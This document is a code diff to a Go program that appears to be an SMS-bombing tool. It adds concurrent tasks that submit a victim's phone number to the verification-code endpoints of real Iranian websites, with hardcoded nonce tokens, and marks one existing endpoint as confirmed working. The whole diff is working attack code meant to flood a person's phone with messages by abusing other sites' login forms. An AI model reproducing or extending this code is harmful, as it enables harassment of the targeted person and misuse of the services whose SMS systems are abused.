@@ -1685,7 +1685,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// techsiro.com (SMS - POST Form)
+		// techsiro.com (SMS - POST Form) ✅ 
  		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1695,6 +1695,40 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://api.techsiro.com/auth/generate-verification-code/", payload, &wg, ch) 
 			}
 		}(client) 
+
+// --- 4hair.ir (POST, FORM)
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("action", "mreeir_send_sms")
+        formData.Set("mobileemail", phone)
+        formData.Set("userisnotauser", "")
+        formData.Set("type", "mobile")
+        formData.Set("captcha", "")
+        formData.Set("captchahash", "")
+        formData.Set("security", "dfd624b63d")
+        sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
+
+// --- zzzagros.com (POST, FORM)
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("action", "awsa-login-with-phone-send-code")
+        formData.Set("nonce", "19b172d9c2") 
+        formData.Set("username", phone)
+        sendFormRequest(c, ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
+
+
+
+
+
+
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 /////////////////////////////////////////////////////ofline-ofline-ofline
